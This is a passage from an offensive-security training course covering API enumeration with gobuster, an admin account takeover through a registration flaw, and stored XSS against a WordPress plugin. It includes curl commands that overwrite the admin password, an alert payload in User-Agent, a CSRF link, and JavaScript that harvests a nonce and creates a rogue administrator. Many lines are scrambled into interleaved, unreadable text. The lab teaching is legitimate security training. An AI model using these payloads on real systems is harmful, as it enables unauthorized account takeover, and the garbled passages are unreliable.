+In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist,
+which will be appended with the version number. To keep our test simple, we'll try with only two
+versions.
+
+We are now ready to enumerate the API with gobuster using the following command:
+
+kali@kali:~$ <cu>gobuster dir -u http://192.168.50.16:5002 -w
+
+/usr/share/wordlists/dirb/big.txt -p pattern</cu>
+
+===============================================================
+
+Gobuster v3.1.0
+
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+
+===============================================================
+
+[+] Url:                      http://192.168.50.16:5001
+
+[+] Method:                   GET
+
+[+] Threads:                  10
+
+[+] Wordlist:                 /usr/share/wordlists/dirb/big.txt
+
+[+] Patterns:                 pattern (1 entries)
+
+[+] Negative Status codes: 404
+
+[+] User Agent:               gobuster/3.1.0
+
+[+] Timeout:                  10s
+
+===============================================================
+2=<=0cr=2=2>/=/b0=o=4o=/k0=s6==/0=v=41:=</1==9cr=:4=>=6==S=t=a=r=ti==n=g=g=o==b(S=ust=at=t=e=ur=si:=n==20=di0=)=re==c[=tSWo=ihizr=te=yl:=o=ew=n2=3um5=e=]r==a=t=io=n==mode
+/console            (Status:  L(32is0S0t8t0in)a)gt1u[[2sSS2i:iJ-zzeBe2efr:0:uf0tre1)2ef96oy[85rcS5]ini]g[zAe-P:-I>P2a4ht1th]ts p://192.168.50.16:5001/ui/]
+/ui                 (Status:
+<cr>/users/v1</cr>
+
+We discovered multiple hits,  iOnSc-lu57d7in52g19tw0 o  interesting       entries  that  seem                                                                               to  be  API  endpoints,
+/books/v1 and /users/v1.
+
+      Tip
+
+   If we browse to the /ui path, we'll discover the entire APIs' documentation. Although this
+
+   is common during white-box testing, it is not a luxury we normally have during a black-
+
+   box test.
+
+Let's first inspect the /users API with curl.
+
+kali@kali:~$ <cu>curl -i http://192.168.50.16:5002/users/v1</cu>
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 241
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 09:27:50 GMT
+
+{
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                 244
+                                                                                                Penetration Testing with Kali Linux
+
+   "users": [
+       {
+          "email": "mail1@mail.com",
+          "username": "name1"
+       },
+       {
+          "email": "mail2@mail.com",
+          "username": "name2"
+       },
+       {
+          "email": "admin@mail.com",
+          "username": "admin"
+       }
+
+   ]
+}
+
+                                                    Listing 123 - Obtaining Users' Information
+
+The application returned three user accounts, including an administrative account that seems to
+be worth further investigation. We can use this information to launch another Gobuster-based
+brute force attack, this time targeting the admin user with a smaller wordlist. To verify if any
+further API property is related to the username property, we'll expand the API path by inserting the
+admin username at the very end.
+
+kali@kali:~$ <cu>gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
+
+/usr/share/wordlists/dirb/small.txt</cu>
+
+===============================================================
+
+Gobuster v3.1.0
+
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+
+===============================================================
+                            Gh10EtTtp://192.168.50.W1hi6t:l5o0w01/users/v1/admin/
+[+] Url:
+[+] Method:
+[+] Threads:
+
+[+] Wordlist:               1/4go00us4bsurs/stehra/r3eJ./ew1fo.f0rrdelyists/dirb/small.txt
+[+] Negative Status codes:
+[+] User Agent:
+[+] Timeout:
+
+2==/<==ce0r=m=2>=2=ai/==/0p=l=4a===/=s=0=s=w=6==o=r0=d=6==<=:=4=/c=0==:r=1=>==2=====S=t=a==(==rS=tt===ian==t=u=gO=s=S=:=g-o==5b=4(=77u0=S=5st5==2==ta)1te==9r[u==0Ss===i:=in=z==e4==0d=:=i=5r)1===4=e[c==2t==S]=io=zr====ey==:=e=n=1=4=u==m=2=e]===r==a==t=i===on====mode
+
+===============================================================
+2022/04/06 06:40:35 Finished
+===============================================================
+
+                                                        Listing 124 - Discovering extra APIs
+
+The password API path seems enticing for our testing purposes, so we'll probe it via curl.
+
+kali@kali:~$ <cu>curl -i http://192.168.50.16:5002/users/v1/admin/password</cu>
+<cr>HTTP/1.0 405 METHOD NOT ALLOWED</cr>
+Content-Type: application/problem+json
+Content-Length: 142
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 10:58:51 GMT
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                   245
+                                                                            Penetration Testing with Kali Linux
+
+{
+   "detail": "The method is not allowed for the requested URL.",
+   "status": 405,
+   "title": "Method Not Allowed",
+   "type": "about:blank"
+
+}
+
+                                             Listing 125 - Discovering API unsupported methods
+
+Interestingly, instead of a 404 Not Found response code, we received a 405 METHOD NOT
+ALLOWED, implying that the requested URL is present, but that our HTTP method is unsupported.
+By default, curl uses the GET method when it performs requests, so we could try interacting with
+the password API through a different method, such as POST or PUT.
+
+Both POST and PUT methods, if permitted on this specific API, could allow us to override the user
+credentials (in this case, the administrator password).
+
+Before attempting a different method, let's verify if the overwritten credentials are accepted. We
+can check if the login method is supported by extending our base URL as follows:
+
+kali@kali:~$ <cu>curl -i http://192.168.50.16:5002/users/v1/login</cu>
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/json
+Content-Length: 48
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 12:04:30 GMT
+
+<cr>{ "status": "fail", "message": "User not found"}</cr>
+
+                                  Listing 126 - Inspecting the `login' API
+
+Although we   were presented   awnitohthaer40cl4eaNrOsTigFnOtUhaNWtDhtihmteleoAswPsIaigtsee, ltfheexsisttast.uWs me oensslyangeeesdtatotesfintdhaat
+the user has  not been found;
+
+NWdprperaueqoesmxupstkime,wrnerwooydwewrpdaJawySoasinOtsslloeNwtJiroonSyfftroOedtrtoNrmhtaoeccadtovtua.ewnstLraveiiteferhvyntr'itsaaitthtm.chtahreetOaesSofa-tu-ib5dsro7osup7avtr5aedr2arrm1aeGt9emqiEn0guT,eyeJstsemreoetfr.qafwburWkyeeeeeysfsci'tlraslsienatnnltpsaosoatetsae.ssmpPinepOgctSiftaThyel"aojsnagoddinnmp"wirnaoistvhuitdshteeherinos"auCumrosnpeetarenaynnalotmd-aTdedyupianmen"dtmhbeayy
+
+specifying a new header with -H.
+
+kali@kali:~$ <cu>curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:
+application/json' http://192.168.50.16:5002/users/v1/login</cu>
+{ "status": "fail", "message": "<cr>Password is not correct for the given
+username.</cr>"}
+
+                                         Listing 127 - Crafting a POST request against the login API
+
+The API return message shows that the authentication failed, meaning that the API parameters
+are correctly formed.
+
+Since we don't know admin's password, let's try another route and check whether we can register
+as a new user. This might lead to a different attack surface.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                              246
+                                                                                            Penetration Testing with Kali Linux
+
+Let's try registering a new user with the following syntax by adding a JSON data structure that
+specifies the desired username and password:
+
+kali@kali:~$<cu>curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-
+Type: application/json' http://192.168.50.16:5002/users/v1/register</cu>
+
+{ "status": "fail", "message": "<cr>'email' is a required property</cr>"}
+                                                Listing 128 - Attempting new User Registration
+
+The API replied with a "fail" message stating that we should also include an email address. We
+could take this opportunity to determine if there's any administrative key we can abuse. Let's add
+the admin key, followed by a True value.
+
+kali@kali:~$<cu>curl -d
+'{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H
+'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register</cu>
+{"message": "<cr>Successfully registered. Login to receive an auth token.</cr>",
+"status": "success"}
+
+                                          Listing 129 - Attempting to register a new user as admin
+
+Since we received no error, it seems we were able to successfully register a new user as an
+admin, which should not be permitted by design. Next, let's try to log in with the credentials we
+just created by invoking the login API we discovered earlier.
+
+kali@kali:~$<cu>curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:
+
+application/json' http://192.168.50.16:5002/users/v1/login</cu>
+
+{<cr>"auth_token":
+
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwi
+
+c3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew"</cr>, "message":
+                                              "- Lsougcgcinegsisn"a}Wshaintaldomw in
+"Successfully  logged  in.",  "status":
+                                 Listing 130
+                                                                                      user
+
+We were able to correctly   sign in  aanndardemtriineviJseetfraafrtJievSyeOuNseWr,ewb eToskheonul(dJWusTe)  authentication token. To
+obtain tangible proof that  we are                                                                          this token to change the
+admin user password.
+
+Wkae'-lHhict@at'knpCa:ola/nittt/:e1e~m9n$t2p-.<tT1cty6uhp8>ise.c:5ub0rya.lp1fop6rl:\gi5ic0na0gt2Oai/Sou-Pns5O/e77jrS5ssT2o/1rnve9'10q/ua\edmsit nth/apat stasrwgoertds'th\e password API.
+
+-H 'Authorization: OAuth
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic
+
+3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+
+-d '{"password": "pwned"}'</cu>
+
+{
+   "detail": "The method is not allowed for the requested URL.",
+   "status": 405,
+   "title": "<cr>Method Not Allowed</cr>",
+   "type": "about:blank"
+
+}
+
+                         Listing 131 - Attempting to Change the Administrator Password via a POST request
+
+We passed the JWT key inside the Authorization header along with the new password.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                   247
+                                                                                             Penetration Testing with Kali Linux
+
+Unfortunately, the application indicates that the HTTP method is unsupported, so we'll try an
+alternative. The PUT method (along with PATCH) is often used to replace a value as opposed to
+creating one via a POST request, so let's try to explicitly define it next:
+
+kali@kali:~$ <cu>curl -X 'PUT' \
+   'http://192.168.50.16:5002/users/v1/admin/password' \
+   -H 'Content-Type: application/json' \
+   -H 'Authorization: OAuth
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic
+3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+
+   -d '{"password": "pwned"}'</cu>
+                          Listing 132 - Attempting to Change the Administrator Password via a PUT request
+
+This time we received no error message, so we can assume the application backend processed
+the request without error. To prove that our attack succeeded, we can try logging in as admin
+using the newly changed password.
+
+kali@kali:~$ <cu>curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type:
+application/json' http://192.168.50.16:5002/users/v1/login</cu>
+{"auth_token":
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwi
+c3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message":
+"Successfully logged in.", "status": "success"}
+
+                                         Listing 133 - Successfully logging in as the admin account
+
+Nice! We managed to take over the admin account by exploiting a logical privilege escalation bug
+present in the registration API.
+
+These kinds of     rperloygoranmcmusintgommAisPtIask, eosftehnapdpueenWthoitotllaovcwakrioofustesdteinggreaensd  when building  web
+applications that                                                                                                secure coding  best
+practices.
+
+So far, we have relied on curl     to  manually  aJesfsfersesy  the       target's  API  so  that  we            could  get  a  better
+sense of the entire traffic flow.
+
+sATaiphsgpinseaifnniacdpaienpnxgrtao.mtLahucpechlek­, ,iplhylre,oowtwx'syeev1cree2arp7n,l.i0rcwe.a0citl.rle1Oe:S8an-tt0ho5e8e7t0a75lpllat2rott1ohe9ptes0hetaerblaycodovmsmecimsantleealponsgwdi.fhnrOeonnamcettevewemdirtohpntitnheea,Bfnurndorupmm.seBbneudrrpi'otsftRoAepPtehIsaetebprertocaxobym, wbesye
+
+can create a new empty request and fill it with the same data as we did previously.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                        248
+                                                                          Penetration Testing with Kali Linux
+
+                                         Figure 109: Crafting a POST request in Burp for API testing
+
+Next, we'll click on the Send button and verify the incoming response on the right pane.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                 Figure 110: Inspecting the API response value
+
+Great! We were able to recreate the same behavior within our proxy, which, among other
+advantages, enables us to store any tested APIs in its database for later investigation.
+
+Once we've tested several different APIs, we could navigate to the Target tab and then Site map.
+We can then retrieve the entire map of the paths we have been testing so far.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                              249
+                                                                                                                                                                                                                                                                                                                                            Penetration Testing with Kali Linux
+
+       Figure 111: Using the Site Map to organize API testing
+
+From Burp's Site map, we can track the API we discovered and forward any saved request to the
+Repeater or Intruder for further testing.
+
+In this Learning Unit, we explored how to debug web applications through the web browser
+console and network developer tools. We then learned what REST APIs are, their role in web
+applications, and how we can approach a black-box penetration test to find weaknesses and
+abuse them.
+
+Now that we've developed a solid understanding of how to map a web application's structure and
+identify its components, we're ready to explore how these findings can lead to exploitation. We'll
+begin with one of the most common -- and dangerous -- vulnerabilities: Cross-Site Scripting.
+
+p···8OTrhn.oi4esceLoPUEsCefxensaprdtrfrilhenoonoerriiswtnsmmtgbhasapinUoc-srdssnhiivcticitiultcirecmsoergoeospervsssoeise-nrrsc-stspsiactruietntaihteptlseaissctftfceirioopOirnapinSlrplttoog-uitvnc5wirin7egeai7gssnvc5sgu2roeo1lLfdns9ee0sasar-oarsJwnbiettiehifnellifagtls-rytdcOeateryybliflppjeWedtenhicansditngtievgldeeosrwwo: uebs  application is data sanitization, a
+                                                                                                                                                                                                                                                                                                                                            characters or strings are removed
+
+or transformed. Unsanitized data allows an attacker to inject, and potentially execute, malicious
+
+code.
+
+Cross-Site Scripting (XSS) is a vulnerability that exploits a user's trust in a website by dynamically
+injecting content into the page rendered by the user's browser.
+
+Once thought to be a relatively low-risk vulnerability, XSS today is both high-risk and prevalent,
+allowing attackers to inject client-side scripts, such as JavaScript, into web pages visited by other
+users.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                    250
+                                                                                                                                             Penetration Testing with Kali Linux
+
+8.4.1 Stored vs reflected XSS theory
+
+XSS vulnerabilities can be grouped into two major classes:
+· Stored
+· Reflected
+
+Stored XSS attacks, also known as Persistent XSS, occur when the exploit payload is stored in a
+database or otherwise cached by a server. The web application then retrieves this payload and
+displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore
+attack all site users. Stored XSS vulnerabilities often exist in forum software, especially in
+comment sections, in product reviews, or wherever user content can be stored and reviewed
+later.
+
+Reflected XSS attacks usually include the payload in a crafted request or link. The web application
+takes this value and places it into the page content. This XSS variant only attacks the person
+submitting the request or visiting the link. Reflected XSS vulnerabilities often occur in search
+fields and results, as well as anywhere user input is included in error messages.
+
+Either of these two vulnerability variants can manifest as client- (browser) or server-side; they can
+also be DOM-based.
+
+DOM-based XSS takes place solely within the page's Document Object Model (DOM). While we
+
+won't cover too much detail for now, we should know that browsers parse a page's HTML content
+
+and then generate an internal DOM representation. This type of XSS occurs when a page's DOM
+
+idisnissmetirnotcedtdiifoiJenadivsawSthictahrtipuDtsOiseMre-c-xboeacnsutertodeldleX.dSSvaaltutaecsk. sDoOcMcu-brawsheWdehintXalSobSwrocwansebr epasrtsoersedtheorparegfele'sctceodn; ttehnet  key
+                                                                                                                                                                                              and
+
+aNcoponptlmiecxaattttiooefnr ,thheoexweucstuhetreevsXisStitShinepgaXtyShloSeaadpfafieysclotdeaeddli.vpeTarJgheeeedf.sfaeTrnehydaistteamxceekcasuntsceadtnh, athnt eethvieenrjtuehcsetelered'ssssbcrboriewptssseigrr,nuninfoicutantnhdtee, rwwtiehtbhe
+8aiemxp.p4pplla.oic2craetstJsiooainnmvcslaeuaSdosifcntthgrhiapeststeuesrssaeeitofrt,arneocrkhssiehj.avOeceSkr-ni5n7tgr7o,5j2afo1n9ricz0eedd
+                                                                                                                                             redirection to malicious  pages, execution of local
+                                                                                                                                             web applications. In the  following sections, we will
+
+JavaScript is a high-level programming language that has become one of the main components
+of modern web applications. All modern browsers include a JavaScript engine that runs
+JavaScript code from within the browser itself.
+
+When a browser processes a server's HTTP response containing HTML, the browser creates a
+DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the
+web page.
+
+JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user
+experience. From an attacker's perspective, this also means that if we can inject JavaScript code
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                      251
+                                                                                              Penetration Testing with Kali Linux
+
+into the application, we can access and modify the page's DOM. With access to the DOM, we can
+redirect login forms, extract passwords, and steal session cookies.
+
+Like many other programming languages, JavaScript can combine a set of instructions into a
+function.
+
+function multiplyValues(x,y) {
+   return x * y;
+
+}
+
+let a = multiplyValues(3, 5)
+console.log(a)
+
+                                                    Listing 134 - Simple JavaScript Function
+
+In Listing 134, we declared a function named multiplyValues on lines 1-3 that accepts two integer
+values as parameters and returns their product.
+
+On line 5, we invoke multiplyValues by passing two integer values, 3 and 5, as parameters, and
+assigning the variable a to the value returned by the function.
+
+When declaring the "a" variable, we don't assign just any type to the variable, since JavaScript is a
+loosely typed language. This means that the actual type of the "a" variable is inferred as a Number
+type based on the type of the invoked function arguments, which are Number types. Finally, on
+line 6 we print the value of "a" to the console.
+
+We can verify the above code by opening the developer tools in Firefox on the about:blank page to
+
+avoid clutter from any extra loaded library.
+
+the blank page is loaded, we'll click  on     the  W+ebWh.Citolnoswole                        the       Developer  sub-menu
+Firefox Menu or use the shortcut         +
+Once                                                                      from                     Web
+
+C B k in the
+
+                                              Jeffrey
+
+OS-57752190
+
+Figure 112: Testing the JavaScript Function in the Browser Console
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                           252
+                                                                          Penetration Testing with Kali Linux
+
+From within the Console, we can execute our test function and retrieve the output.
+
+Printing values to the browser's console is another technique we can add to our debugging toolkit
+that will be extremely useful when analyzing more complex JavaScript code.
+
+8.4.3 Identifying XSS vulnerabilities
+
+We can find potential entry points for XSS by examining a web application and identifying input
+fields (such as search fields) that accept unsanitized input, which is then displayed as output in
+subsequent pages.
+
+Once we identify an entry point, we can input special characters and observe the output to
+determine if any of the special characters return unfiltered.
+
+The most common special characters used for this purpose include:
+
+<>'"{};
+
+         Listing 135 - Special characters for HTML and JavaScript
+
+Let's describe the purpose of these special characters. HTML uses "<" and ">" in markup syntax to
+denote elements, the various components that make up an HTML document. JavaScript uses "{"
+and "}" in function declarations. Single (') and double (") quotes are used to denote strings, and
+semicolons (;) are used to mark the end of a statement.
+
+If the application does not remove or encode these characters, it may be vulnerable to XSS
+because the app interprets the characters as code, which in turn, enables additional code.
+
+"aHWis%rTeh2uMi0Hsle"LeT.tdMheentLorceeocnadocrinneogvdmein(ruotglrtnaipconhlneda-AtrUyaSRpcCLteeIseIr noarcefnofedednrirecnenogscd,eeUinrsvRg)eL,dctJeahecnnefhcfmbaoreredoayisucnttsgWeceh, roidsstmoltimonomwedUotiinRsmpLwelsaes,y'lsrlecuefhcneahcrrroaeaucdsntettcoerosranistnvhepawretteirnncbgoeanrampt pesalniplclcyaaocthdieoainnvtgose,
+Ieesfplnewecmoceiueanncl ttamebnreuiniatngnwjeitnihcllgtidssti,sthylpeipklsaeeeyottasfhgpeeeneaccliceaotmlOduSiacen-lhng5cat7,shr7t.aah5cFr2eat1oebc9rrt0rseeorxwianasmtseo-ripstwl.eh,iell&nplota;tgeiins,tetthrhpeerebctrhotahwreasccethrearwrraielclfteterrreeaantscetthhfeeomrst\aa<rs.t
+                                                                                                                                                                                                                                                                                              When
+                                                                                                                                                                                                                                                                                              of an
+
+                                                                                                                                                                                                                                                                                              code
+
+elements. We can then begin to build code that will be executed in the victim's browser once it
+
+loads the maliciously injected JavaScript code.
+
+We may need to use different sets of characters, depending on where our input is being included.
+For example, if our input is being added between div tags, we'll need to include our own script tags
+and need to be able to inject "<" and ">" as part of the payload. If our input is being added within
+an existing JavaScript tag, we might only need quotes and semicolons to add our own code.
+
+8.4.4 Basic XSS
+
+Let's demonstrate basic XSS with a simple attack against the OffSec WordPress instance. The
+WordPress installation is running a plugin named Visitors that is vulnerable to stored XSS. The
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                      253
+                                                                          Penetration Testing with Kali Linux
+
+plugin's main feature is to log the website's visitor data, including the IP, source, and User-Agent
+fields.
+
+The source code for the plugin can be downloaded from its website. If we inspect the
+database.php file, we can verify how the data is stored inside the WordPress database:
+
+function VST_save_record() {
+       global $wpdb;
+       $table_name = $wpdb->prefix . 'VST_registros';
+
+   VST_create_table_records();
+
+       return $wpdb->insert(
+                             $table_name,
+                             array(
+                                    'patch' => $_SERVER["REQUEST_URI"],
+                                    'datetime' => current_time( 'mysql' ),
+                                    <cr>'useragent' => $_SERVER['HTTP_USER_AGENT'],</cr>
+                                    'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
+                             )
+
+                     );
+}
+
+                                      Listing 136 - Inspecting Visitor Plugin Record Creation Function
+
+This PHP function is responsible for parsing various HTTP request headers, including the User-
+Agent, which is saved in the useragent record value.
+
+Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the
+
+f$foiolr=locewoaucinhng(tV(pSVoSTr_Tt_giogentet_o_rfercecoocdrordesdfs(ro$($dmdaatsett_ea_srtts.atprahtrp,t:,$$ddataet_ef_fiininWsihihst)hl)oa)ws; $record) {
+
+   echo '      <<cttldadsssscc="ooppacee==t"i"rvreooww""">>>''..$dia.t'e_</ftordJ>meaftf(rdeayte_create($record->datetime),
+          <tr
+
+g>eitp_.'o#ptipiornes("u<<<lltctitdrd"n>>ks<ss'tcc_.doou$>pppr'eeed=.=ca"$"torrrreeooddcww_-""od>raiO>d>tpS<'e-.-a._>'5$fu<77rhos/5errea2ecmr>1foaa<9r=tg/0d""eth)nd-t)t>>t..pp''as<<t://c/tth/dd.w>>'w<<w//.ctgrde>>olocation.com/es?ip='.$record-
+
+   </tr>';
+
+   $i--;
+
+}
+
+               Listing 137 - Inspecting Visitors Plugin Record Visualization Function
+
+From the above code, we'll notice that the useragent record value is retrieved from the database
+and inserted plainly in the Table Data (td) HTML tag, without any sort of data sanitization.
+
+As the User-Agent header is under user control, we could craft an XSS attack by inserting a script
+tag invoking the alert() method to generate a pop-up message. Given the immediate visual
+impact, this method is very commonly used to verify that an application is vulnerable to XSS.
+
+      Info
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                             254
+                                                                                                                              Penetration Testing with Kali Linux
+
+     Although we just performed a white-box testing approach, we could have discovered the
+     same vulnerability by testing the plugin through black-box HTTP header fuzzing.
+With Burp configured as a proxy and Intercept disabled, we can start our attack by first browsing
+to http://offsecwp/ using Firefox.
+We'll then go to Burp Proxy > HTTP History, right-click on the request, and select Send to Repeater.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                              Figure 113: Forwarding the request to the Repeater
+
+Moving to the Repeater tab, we can replace the default User-Agent value with a script tag that
+includes the alert method (<script>alert(42)</script>), then send the request.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  255
+                                                                          Penetration Testing with Kali Linux
+
+Figure 114: Forwarding the request to the Repeater
+
+If the server responds with a 200 OK message, we should be confident that our payload is now
+stored in the WordPress database.
+
+To verify this, let's log in to the admin console at http://offsecwp/wp-login.php using the
+
+abaIfddamnmniinenw/r/peasadhsmoswwinniona.prvghdigtpcha?retpeeadngueenm=ttibvaoeilssri.t4o2rt,shp-earopvpi%nVg2isFthiataodJtrmseofiunfr%rce2pyoFldusWegthaiiinnrttjl.epochwtpcioo,nnwwsoeolrekaerde.  at http://offsecwp/wp-
+                                                                                                                                                                                                       greeted with a pop-up
+
+OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                              256
+                                                                              Penetration Testing with Kali Linux
+
+                             Figure 115: Demonstrating the XSS vulnerability
+
+Excellent. We have injected an XSS payload into the web application's database and it will be
+
+served to any administrator that loads the plugin. A simple alert window is a somewhat trivial
+
+example of what can be done with XSS, so let's try something more interesting, like creating a
+
+new administrative account.
+
+8.4.5 Privilege escalation via XSS  Whitlow
+
+ehSxainpvclionegrweitedeiafxfreeercenunottewadvcbeaynputahebesleafodormf ositnbotuarisinnegirnJgwahavedanmSclJionreiaifpsdfttirrcnaeogytidvteheeipnprsiavidgileeeg,thweese.t'raergreeatdWyotordgPeret smsoarpepclirceaattiiovne  and
+                                                                                                                                                                                                                                 and
+
+ciWnoseuelccdoumureladsselqesuvseeirroaandgeemaoasnutarhgXaeStmSusetenortOwsSc-toie5tnha7fi7lnig5c2utoh1roe9ak0ttiiaeosrng.aeIntf dwweesbecssasintioes.nteinafloarnmaautitohneniftitchaeteadppulsicear'tsiocnoouksiees,          an
+                                                                                                                                                                                                                                 we
+
+Websites use cookies to track state and information about users. Cookies can be set with several
+
+optional flags, including two that are particularly interesting to us as penetration testers: Secure
+
+and HttpOnly.
+
+The Secure flag instructs the browser to only send the cookie over encrypted connections, such
+as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
+
+The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not
+set, we can use an XSS payload to steal the cookie.
+
+Let's verify the nature of WordPress' session cookies by first logging in as the admin user.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                         257
+                                                                                                                              Penetration Testing with Kali Linux
+
+Next, we can open the Web Developer Tools, navigate to the Storage tab, then click on
+http://offsecwp under the Cookies menu on the left.
+
+                        Figure 116: Inspecting WordPress Cookies
+
+We notice that our browser has stored six different cookies, but only four are session cookies. Of
+these four cookies, if we exclude the negligible wordpress_test_cookie, all support the HttpOnly
+feature.
+
+Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be
+retrieved via JavaScript through our attack vector. We'll need to find a new angle.
+
+When the admin loads the Visitors plugin dashboards that contains the injected JavaScript, it
+executes whatever we provided as a payload, be it an alert pop-up banner or a more complex
+JavaScript function.
+
+For instance, we could craft a JavaScript function that adds another WordPress administrative
+account, so that once the real administrator executes our injected code, the function will execute
+behind the scenes.
+
+To succeed with our attack angle, we need to cover another web application attack class.
+                                               sncoenncaer.ioWahistdleowpicted
+To develop this attack, we'll build a similar                                                                   by  Shift8.  First,  we'll  create  a                                                               JS
+function that fetches the WordPress admin
+
+The  pnroenvceentisCarossesr-vSeitre-g-Reenqeuraetset-dFotorgkeenryt(hCaStRJiseFf)ifnarcteltuyadcekds.in  each  HTTP  request  to    add  randomness
+and
+
+ApTehCrefSomRrmFalsiacatitoapucrsekcloioncnkcfiugcrousurevlddiaabsceoticdoOiinasSlg-o5eun7nis7bge5ei2dnh1ea9bel0fyrionafgnthinaepwupshaeircre.hnttlhyehvaircmtimlescslidckesscorinptaiomn, aolifctieonuslulriinnkg  that
+                                                                                                                                                                                                                     the
+
+victim to click on it.
+
+<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000">Check out
+these awesome cat memes!</a>
+
+                                                        Listing 138 - CSRF example attack
+
+In the above example, the URL link is pointing to a Fake Crypto Bank website API, which performs
+a bitcoin transfer to the attacker account. If this link was embedded into the HTML code of an
+email, the user would be only able to see the link description, but not the actual HTTP resource it
+is pointing to. This attack would be successful if the user is already logged in with a valid session
+on the same website.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                            258
+                                                                          Penetration Testing with Kali Linux
+
+In our case, by including and checking the pseudo-random nonce, WordPress prevents this kind
+of attack, since an attacker could not have prior knowledge of the token. However, as we'll soon
+explain, the nonce won't be an obstacle for the stored XSS vulnerability we discovered in the
+plugin.
+
+As mentioned, to perform any administrative action, we need to first gather the nonce. We can
+accomplish this using the following JavaScript function:
+
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = <cr>/ser" value="([^"]*?)"/g;</cr>
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+                                                    Listing 139 - Gathering WordPress Nonce
+
+This function performs a new HTTP request towards the /wp-admin/user-new.php URL and
+saves the nonce value found in the HTTP response based on the regular expression. The regex
+pattern matches any alphanumeric value contained between the string /ser" value=" and double
+quotes.
+
+Now that we've dynamically retrieved the nonce, we can craft the main function responsible for
+creating the new admin user.
+
+var params = "action=createuser&_wpnonce_create-
+
+user="+nonce+"&<cr>user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pa
+
+ss2=attackerpass&role=administrator</cr>";     "aWphiptlliocwation/x-www-form-urlencoded");
+
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type",
+
+ajaxRequest.send(params);                      1is40t-hCereanteinwg abNaJeecwfkfWdrooeroydrPeredssaAddmmiinnistaractcoroAucncto,unjut st  after  the  nonce                                                                            we
+                                      Listing
+
+Highlighted in this function
+aTeonpbotptiarleieicnnaWestduioorrpendr,Pewtvrheeiaosntusesoielnyuds.rttIaofJllfoaairvutsiarotSnamc.trtiinaOpSictf-ky5pi7sta7,uyt5chl2oce1ean9ed0ednswc, iolwldeeb'lelit.bheaanbdlleedtocgoarriencatldymbinyisBtruartpiveanadccethses
+                                                                                                                                                                                                                                       to the
+                                                                                                                                                                                                                                       target
+
+To minify our attack code into a one-liner, we can navigate to JS Compress.
+
